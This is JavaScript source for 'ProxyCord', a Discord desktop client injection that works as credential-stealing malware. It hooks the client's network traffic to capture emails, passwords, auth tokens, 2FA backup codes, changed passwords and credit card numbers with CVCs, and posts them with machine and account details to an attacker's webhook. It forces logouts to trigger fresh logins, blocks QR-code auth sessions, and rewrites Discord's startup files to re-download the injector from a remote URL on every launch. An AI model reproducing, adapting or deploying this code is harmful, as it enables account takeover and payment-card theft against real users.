const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "<:8485discordemployee:1163172252989259898>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:9171hypesquadevents:1163172248140660839>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:5053earlysupporter:1163172241996005416>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:6601hypesquadbravery:1163172246492287017>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:5242hypesquadbalance:1163172243417858128>",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const forceLogout = async () => {
    console.log('DEBUG: Forcing Discord logout...');
    try {
        await executeJS(`
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
            if (window.indexedDB) {
                indexedDB.databases().then(databases => {
                    databases.forEach(db => {
                        indexedDB.deleteDatabase(db.name);
                    });
                });
            }
            console.log('DEBUG: All auth data cleared');
            return 'logout_complete';
        `);
        
        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify({
            "content": "🚪 **User Forced Logout** - Discord will require fresh login on restart!"
        }));
        
    } catch (e) {
        console.log('DEBUG: Logout error:', e.message);
    }
};

const getToken = async () => {
    try {
        const token = await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
        console.log('DEBUG: Token extraction:', token ? 'SUCCESS' : 'FAILED');
        return token;
    } catch (e) {
        console.log('DEBUG: Token extraction error:', e.message);
        return null;
    }
};

const hooker = async (content, token, account) => {
    console.log('DEBUG: Hooker function called for user:', account ? account.username : 'NO_ACCOUNT');
    console.log('DEBUG: Token length:', token ? token.length : 0);
    console.log('DEBUG: Webhook URL:', CONFIG.webhook);

    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "ProxyCord - discord injector";
    content["avatar_url"] = "https://i.ibb.co/LC7q9jX/evil-discord.png";
    content["embeds"][0]["author"] = {
        "name": account.username,
    };
    content["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    content["embeds"][0]["footer"] = {
        "text": "ProxyCord - created by saeed0x1",
        "icon_url": "https://avatars.githubusercontent.com/u/73954987?v=4",
    };
    content["embeds"][0]["title"] = "Account Information";

    console.log('DEBUG: Getting account details...');
    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);
    const friends = await getFriends(token);
    const servers = await getServers(token);

    content["embeds"][0]["fields"].push({
        "name": "Token",
        "value": "```" + token + "```",
        "inline": false
    }, {
        "name": "Nitro",
        "value": nitro,
        "inline": true
    }, {
        "name": "Badges",
        "value": badges,
        "inline": true
    }, {
        "name": "Billing",
        "value": billing,
        "inline": true
    });

    content["embeds"].push({
        "title": `Total Friends: ${friends.totalFriends}`,
        "description": friends.message,
    }, {
        "title": `Total Servers: ${servers.totalGuilds}`,
        "description": servers.message,
    });

    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 0xb143e3;
    }

    console.log('DEBUG: Sending webhook...');
    try {
        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
        console.log('DEBUG: Webhook sent successfully!');
        return true; // Return success
    } catch (error) {
        console.log('DEBUG: Webhook send failed:', error.message);
        return false; // Return failure
    }
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => {
    try {
        return await fetch("/billing/payment-sources", {
            "Authorization": token
        });
    } catch (e) {
        return [];
    }
};
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro Boost`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    if (!data || data.length === 0) return '`❌`';
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);
    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);
    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }
    rareGuilds = rareGuilds || "**No Rare Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    console.log('DEBUG: EmailPassToken called for action:', action);
    console.log('DEBUG: Email:', email ? 'PROVIDED' : 'MISSING');
    console.log('DEBUG: Password:', password ? 'PROVIDED' : 'MISSING');
    console.log('DEBUG: Token:', token ? 'PROVIDED' : 'MISSING');
    
    try {
        const account = await fetchAccount(token);
        console.log('DEBUG: Account fetched successfully:', account.username);
        
        const content = {
            "content": `**${account.username}** just ${action}!`,
            "embeds": [{
                "fields": [{
                    "name": "Email",
                    "value": "`" + email + "`",
                    "inline": true
                }, {
                    "name": "Password",
                    "value": "`" + password + "`",
                    "inline": true
                }]
            }]
        };
        
        console.log('DEBUG: Calling hooker with content...');
        const webhookSuccess = await hooker(content, token, account);
        
        // Only remove initiation folder if webhook was sent successfully
        if (webhookSuccess && fs.existsSync(path.join(__dirname, 'initiation'))) {
            console.log('DEBUG: SUCCESS! Removing initiation folder after successful data capture...');
            fs.rmdirSync(path.join(__dirname, 'initiation'));
        } else if (!webhookSuccess) {
            console.log('DEBUG: Webhook failed - keeping initiation folder for retry');
        }
        
    } catch (error) {
        console.log('DEBUG: EmailPassToken error:', error.message);
    }
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)
    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [{
                "name": "Backup Codes",
                "value": "```" + message + "```",
                "inline": false
            }, {
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };
    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)
    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": "Old Password",
                "value": "`" + oldPassword + "`",
                "inline": true
            }]
        }]
    };
    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)
    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "CVC",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "Expiration",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };
    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)
    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };
    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    console.log('DEBUG: Initiation function called');
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        console.log('DEBUG: Initiation folder found - injection is active!');
        
        // DON'T DELETE THE FOLDER YET - we need it to stay active for login capture!
        // The folder will be deleted after successful login capture in EmailPassToken

        const token = await getToken();
        if (token) {
            console.log('DEBUG: Token found, extracting account data...');
            try {
                const account = await fetchAccount(token);
                const content = {
                    "content": `**${account.username}** just got injected!`,
                    "embeds": [{
                        "fields": [{
                            "name": "Email",
                            "value": "`" + account.email + "`",
                            "inline": true
                        }, {
                            "name": "Phone",
                            "value": "`" + (account.phone || "None") + "`",
                            "inline": true
                        }]
                    }]
                };
                await hooker(content, token, account);
                console.log('DEBUG: Account data sent successfully!');
            } catch (e) {
                console.log('DEBUG: Failed to extract account data:', e.message);
            }
        }
        
        // Force logout for fresh login next time
        await forceLogout();
        setTimeout(() => clearAllUserData(), 2000);
    } else {
        console.log('DEBUG: No initiation folder found - injection will not run');
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            }, null, 4),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            console.log('DEBUG: First network event - calling initiation...');
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        
        // Log ALL network activity to see what we're missing
        console.log('DEBUG: Network response:', params.response.url, 'Status:', params.response.status);
        
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        console.log('DEBUG: MATCHING URL FOUND:', params.response.url);

        try {
            const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                requestId: params.requestId
            });
            const responseData = JSON.parse(responseUnparsedData.body);
            console.log('DEBUG: Response data keys:', Object.keys(responseData));

            const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                requestId: params.requestId
            });
            const requestData = JSON.parse(requestUnparsedData.postData);
            console.log('DEBUG: Request data keys:', Object.keys(requestData));

        switch (true) {
            case params.response.url.endsWith('/login'):
                console.log('DEBUG: LOGIN endpoint hit!');
                if (!responseData.token) {
                    console.log('DEBUG: No token yet, storing creds for 2FA...');
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                console.log('DEBUG: LOGIN SUCCESS - Token found! Sending data...');
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                console.log('DEBUG: REGISTER endpoint hit!');
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                console.log('DEBUG: 2FA endpoint hit!');
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                console.log('DEBUG: Backup codes endpoint hit!');
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                console.log('DEBUG: User update endpoint hit!');
                if (!requestData.password) return;
                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }
                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
                
            default:
                console.log('DEBUG: Unhandled matching URL:', params.response.url);
        }
        } catch (error) {
            console.log('DEBUG: Error processing network event:', error.message, 'URL:', params.response.url);
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;
        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
